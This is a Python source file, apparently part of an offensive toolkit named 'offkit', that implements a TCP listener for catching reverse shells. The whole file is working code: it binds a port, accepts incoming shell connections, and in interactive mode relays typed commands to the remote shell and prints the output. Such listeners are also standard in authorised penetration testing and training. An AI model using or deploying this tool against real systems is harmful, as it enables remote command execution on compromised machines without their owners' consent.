"""
listener — TCP reverse-shell catcher
"""

from __future__ import annotations

DESCRIPTION = "TCP listener for reverse shells"

import argparse
import socket
import sys
import threading
from datetime import datetime


def handle(conn: socket.socket, addr: tuple) -> None:
    print(f"\n[+] {addr[0]}:{addr[1]}  {datetime.now().isoformat()}")
    try:
        while True:
            data = conn.recv(4096)
            if not data:
                break
            sys.stdout.write(data.decode("utf-8", errors="replace"))
            sys.stdout.flush()
    except (ConnectionResetError, BrokenPipeError):
        pass
    finally:
        print(f"\n[-] closed {addr[0]}:{addr[1]}")
        try:
            conn.close()
        except Exception:
            pass


def interactive(conn: socket.socket, addr: tuple) -> None:
    print(f"\n[+] interactive {addr[0]}:{addr[1]}")
    print("[*] ctrl+c drops session, listener stays up\n")
    try:
        while True:
            try:
                cmd = input()
                if not cmd:
                    continue
                conn.sendall((cmd + "\n").encode())
                conn.settimeout(0.5)
                try:
                    while True:
                        data = conn.recv(4096)
                        if not data:
                            break
                        sys.stdout.write(data.decode("utf-8", errors="replace"))
                        sys.stdout.flush()
                except socket.timeout:
                    pass
                finally:
                    conn.settimeout(None)
            except (EOFError, KeyboardInterrupt):
                print("\n[*] session dropped")
                break
    finally:
        try:
            conn.close()
        except Exception:
            pass


def run(argv: list[str]) -> None:
    p = argparse.ArgumentParser(prog="offkit listener", description=DESCRIPTION)
    p.add_argument("-p", "--port", type=int, required=True)
    p.add_argument("-b", "--bind", default="0.0.0.0")
    p.add_argument("-i", "--interactive", action="store_true")
    args = p.parse_args(argv)

    if not (1 <= args.port <= 65535):
        print("[!] invalid port")
        sys.exit(1)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sock.bind((args.bind, args.port))
    except OSError as e:
        print(f"[!] bind failed: {e}")
        sys.exit(1)

    sock.listen(5)
    print(f"[*] listening {args.bind}:{args.port}")
    print("[*] ctrl+c to stop\n")

    try:
        while True:
            conn, addr = sock.accept()
            if args.interactive:
                interactive(conn, addr)
            else:
                threading.Thread(target=handle, args=(conn, addr), daemon=True).start()
    except KeyboardInterrupt:
        print("\n[*] stopped")
    finally:
        sock.close()
